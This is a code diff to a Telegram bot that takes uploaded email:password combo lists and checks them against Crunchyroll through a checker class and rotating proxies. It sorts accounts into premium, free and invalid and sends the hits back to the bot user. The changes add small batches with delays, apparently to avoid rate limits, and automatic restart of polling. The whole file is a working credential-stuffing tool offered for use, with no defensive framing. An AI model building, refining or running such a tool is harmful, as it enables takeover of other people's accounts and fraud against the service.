@@ -235,7 +235,7 @@ async def handle(message: types.Message):
         checker.proxies = proxies
         return await message.answer(f"✅ Loaded {len(proxies)} proxies!")
 
-    # Combo checking - STRICT email:password only (ignores all messy text)
+    # Combo checking - Very safe small batches (2 at a time)
     if message.document:
         file = await bot.get_file(message.document.file_id)
         content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
@@ -247,17 +247,11 @@ async def handle(message: types.Message):
         raw = raw.strip()
         if not raw:
             continue
-
-        # Extract ONLY email:password - ignore everything else
         if ':' in raw and '@' in raw:
             try:
-                # Split on first :
                 email_part, rest = raw.split(':', 1)
                 email = email_part.strip()
-
-                # Take only the first word after : as password (ignore | and extra text)
                 password = rest.split()[0].strip().split('|')[0].strip()
-
                 if email and password and '@' in email:
                     lines.append(email + ":" + password)
             except:
@@ -269,25 +263,27 @@ async def handle(message: types.Message):
     total = len(lines)
     await message.answer(f"🚀 Checking {total} combos... (fast mode)")
 
-    for line in lines:
-        try:
-            email, password = line.split(":", 1)
-            result = checker.check(email.strip(), password.strip())
+    for i in range(0, total, 2):   # Only 2 at a time to prevent freezing
+        batch = lines[i:i+2]
+        for line in batch:
+            try:
+                email, password = line.split(":", 1)
+                result = checker.check(email.strip(), password.strip())
 
-            stats['checked'] += 1
-            if result['status'] == 'PREMIUM':
-                stats['premium'] += 1
-            elif result['status'] == 'FREE':
-                stats['free'] += 1
-            else:
-                stats['invalid'] += 1
+                stats['checked'] += 1
+                if result['status'] == 'PREMIUM':
+                    stats['premium'] += 1
+                elif result['status'] == 'FREE':
+                    stats['free'] += 1
+                else:
+                    stats['invalid'] += 1
 
-            await send_result(message.from_user.id, result)
+                await send_result(message.from_user.id, result)
 
-            await asyncio.sleep(1.0 + random.uniform(0.2, 0.6))
+            except:
+                continue
 
-        except:
-            continue
+        await asyncio.sleep(1.8)  # Safe delay between small batches
 
     await message.answer("✅ Finished checking all combos!")
 
@@ -296,7 +292,13 @@ async def main():
     global checker
     checker = CrunchyrollChecker(proxies)
     print("✅ Bot started")
-    await dp.start_polling(bot)
+
+    while True:
+        try:
+            await dp.start_polling(bot, skip_updates=True)
+        except Exception as e:
+            print(f"Polling error: {e}. Restarting in 5s...")
+            await asyncio.sleep(5)
 
 
 if __name__ == "__main__":
